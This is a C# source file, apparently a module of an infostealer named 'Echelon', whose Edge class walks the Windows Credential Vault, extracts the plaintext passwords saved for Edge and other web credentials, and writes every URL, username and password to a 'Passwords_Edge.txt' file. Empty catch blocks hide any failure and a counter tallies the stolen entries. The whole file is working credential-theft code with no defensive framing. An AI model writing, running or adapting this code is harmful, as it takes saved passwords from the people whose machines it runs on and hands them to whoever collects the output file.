using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.InteropServices;
using System.IO;

namespace Echelon
{
    class Edge
    {
        public static int count = 0;
        public static void Start(string Browsers)
        {
            
            try { 
            DesktopWriter.SetDirectory(Browsers);

            Version OSVersion = Environment.OSVersion.Version;
            int OSMajor = OSVersion.Major;
            int OSMinor = OSVersion.Minor;

            /* Helper function to extract the ItemValue field from a VAULT_ITEM_ELEMENT struct */
            object GetVaultElementValue(IntPtr vaultElementPtr)
            {
                object results;
                object partialElement = Marshal.PtrToStructure(vaultElementPtr, typeof(VaultCli.VAULT_ITEM_ELEMENT));
                FieldInfo partialElementInfo = partialElement.GetType().GetField("Type");
                object partialElementType = partialElementInfo.GetValue(partialElement);

                var elementPtr = (IntPtr)(vaultElementPtr.ToInt64() + 16);
                switch ((int)partialElementType)
                {
                    case 7: // VAULT_ELEMENT_TYPE == String; These are the plaintext passwords!
                        IntPtr StringPtr = Marshal.ReadIntPtr(elementPtr);
                        results = Marshal.PtrToStringUni(StringPtr);
                        break;
                    case 0: // VAULT_ELEMENT_TYPE == bool
                        results = Marshal.ReadByte(elementPtr);
                        results = (bool)results;
                        break;
                    case 1: // VAULT_ELEMENT_TYPE == Short
                        results = Marshal.ReadInt16(elementPtr);
                        break;
                    case 2: // VAULT_ELEMENT_TYPE == Unsigned Short
                        results = Marshal.ReadInt16(elementPtr);
                        break;
                    case 3: // VAULT_ELEMENT_TYPE == Int
                        results = Marshal.ReadInt32(elementPtr);
                        break;
                    case 4: // VAULT_ELEMENT_TYPE == Unsigned Int
                        results = Marshal.ReadInt32(elementPtr);
                        break;
                    case 5: // VAULT_ELEMENT_TYPE == Double
                        results = Marshal.PtrToStructure(elementPtr, typeof(double));
                        break;
                    case 6: // VAULT_ELEMENT_TYPE == GUID
                        results = Marshal.PtrToStructure(elementPtr, typeof(Guid));
                        break;
                    case 12: // VAULT_ELEMENT_TYPE == Sid
                        IntPtr sidPtr = Marshal.ReadIntPtr(elementPtr);
                        var sidObject = new System.Security.Principal.SecurityIdentifier(sidPtr);
                        results = sidObject.Value;
                        break;
                    default:
                        /* Several VAULT_ELEMENT_TYPES are currently unimplemented according to
                         * Lord Graeber. Thus we do not implement them. */
                        results = null;
                        break;
                }
                return results;
            }
            /* End helper function */

            int vaultCount = 0;
            IntPtr vaultGuidPtr = IntPtr.Zero;
            int result = VaultCli.VaultEnumerateVaults(0, ref vaultCount, ref vaultGuidPtr);

            //var result = CallVaultEnumerateVaults(VaultEnum, 0, ref vaultCount, ref vaultGuidPtr);

            if (result != 0)
            {
                DesktopWriter.WriteLine(string.Format(("[ERROR] Unable to enumerate vaults. Error (0x" + result.ToString() + ")")));
            }

            // Create dictionary to translate Guids to human readable elements
            IntPtr guidAddress = vaultGuidPtr;
            var vaultSchema = new Dictionary<Guid, string>
            {
                { new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"), "Windows Secure Note" },
                { new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"), "Windows Web Password Credential" },
                { new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"), "Windows Credential Picker Protector" },
                { new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"), "Web Credentials" },
                { new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"), "Windows Credentials" },
                { new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"), "Windows Domain Certificate Credential" },
                { new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"), "Windows Domain Password Credential" },
                { new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"), "Windows Extended Credential" },
                { new Guid("00000000-0000-0000-0000-000000000000"), null }
            };

            for (int i = 0; i < vaultCount; i++)
            {
                // Open vault block
                object vaultGuidString = Marshal.PtrToStructure(guidAddress, typeof(Guid));
                var vaultGuid = new Guid(vaultGuidString.ToString());
                guidAddress = (IntPtr)(guidAddress.ToInt64() + Marshal.SizeOf(typeof(Guid)));
                IntPtr vaultHandle = IntPtr.Zero;
                string vaultType = vaultSchema.ContainsKey(vaultGuid) ? vaultSchema[vaultGuid] : vaultGuid.ToString();
                result = VaultCli.VaultOpenVault(ref vaultGuid, 0, ref vaultHandle);
                if (result != 0)
                {
                    DesktopWriter.WriteLine(string.Format($"Unable to open the following vault: {vaultType}. Error: 0x{result.ToString()}"));
                }
                // Vault opened successfully! Continue.

                // Fetch all items within Vault
                int vaultItemCount = 0;
                IntPtr vaultItemPtr = IntPtr.Zero;
                result = VaultCli.VaultEnumerateItems(vaultHandle, 512, ref vaultItemCount, ref vaultItemPtr);
                if (result != 0)
                {
                    DesktopWriter.WriteLine(string.Format($"[ERROR] Unable to enumerate vault items from the following vault: {vaultType}. Error 0x{result.ToString()}"));
                }
                IntPtr structAddress = vaultItemPtr;
                if (vaultItemCount > 0)
                {
                    // For each vault item...
                    for (int j = 1; j <= vaultItemCount; j++)
                    {

                        Type VAULT_ITEM = OSMajor >= 6 && OSMinor >= 2 ? typeof(VaultCli.VAULT_ITEM_WIN8) : typeof(VaultCli.VAULT_ITEM_WIN7);
                        // Begin fetching vault item...
                        object currentItem = Marshal.PtrToStructure(structAddress, VAULT_ITEM);
                        structAddress = (IntPtr)(structAddress.ToInt64() + Marshal.SizeOf(VAULT_ITEM));

                        IntPtr passwordVaultItem = IntPtr.Zero;
                        // Field Info retrieval
                        FieldInfo schemaIdInfo = currentItem.GetType().GetField("SchemaId");
                        var schemaId = new Guid(schemaIdInfo.GetValue(currentItem).ToString());
                        FieldInfo pResourceElementInfo = currentItem.GetType().GetField("pResourceElement");
                        var pResourceElement = (IntPtr)pResourceElementInfo.GetValue(currentItem);
                        FieldInfo pIdentityElementInfo = currentItem.GetType().GetField("pIdentityElement");
                        var pIdentityElement = (IntPtr)pIdentityElementInfo.GetValue(currentItem);
                        FieldInfo dateTimeInfo = currentItem.GetType().GetField("LastModified");
                        ulong lastModified = (ulong)dateTimeInfo.GetValue(currentItem);
                        IntPtr pPackageSid = IntPtr.Zero;
                        if (OSMajor < 6 || OSMinor < 2)
                        {
                            result = VaultCli.VaultGetItem_WIN7(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, IntPtr.Zero, 0, ref passwordVaultItem);
                        }
                        else
                        {
                            // Newer versions have package sid
                            FieldInfo pPackageSidInfo = currentItem.GetType().GetField("pPackageSid");
                            pPackageSid = (IntPtr)pPackageSidInfo.GetValue(currentItem);
                            result = VaultCli.VaultGetItem_WIN8(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, pPackageSid, IntPtr.Zero, 0, ref passwordVaultItem);
                        }

                        if (result != 0)
                        {
                            DesktopWriter.WriteLine(string.Format($"Error occured while retrieving vault item. Error: 0x{result.ToString()}"));
                        }
                        object passwordItem = Marshal.PtrToStructure(passwordVaultItem, VAULT_ITEM);
                        FieldInfo pAuthenticatorElementInfo = passwordItem.GetType().GetField("pAuthenticatorElement");
                        var pAuthenticatorElement = (IntPtr)pAuthenticatorElementInfo.GetValue(passwordItem);
                        // Fetch the credential from the authenticator element
                        object cred = GetVaultElementValue(pAuthenticatorElement);
                        object packageSid = null;
                        if (pPackageSid != IntPtr.Zero && pPackageSid != null)
                        {
                            packageSid = GetVaultElementValue(pPackageSid);
                        }
                        if (cred != null) // Indicates successful fetch
                        {
                            object resource = GetVaultElementValue(pResourceElement);
                            if (resource != null)
                            {
                                DesktopWriter.WriteLine(string.Format("Url: {0}", resource));
                            }
                            object identity = GetVaultElementValue(pIdentityElement);
                            if (identity != null)
                            {
                                DesktopWriter.WriteLine(string.Format("Username: {0}", identity));
                            }
                            if (packageSid != null)
                            {
                                DesktopWriter.WriteLine(string.Format("PacakgeSid: {0}", packageSid));
                            }
                            DesktopWriter.WriteLine(string.Format("Password: {0}" + "\n\n", cred));
                                count++;
                        }
                    }
                }
            }
            }
            catch  { }
        }

    }

    public static class DesktopWriter
    {
        static string directory = "";

        public static void SetDirectory(string dir)
        {
            try
            {
                directory = dir;
            }
            catch  { }
        }

        public static void WriteLine(string str)
        {
            try
            {
                string fn = Path.Combine(directory, "Passwords_Edge.txt");
            File.AppendAllLines(fn, new List<string>() { str });
            }
            catch  { }
        }
    }
}
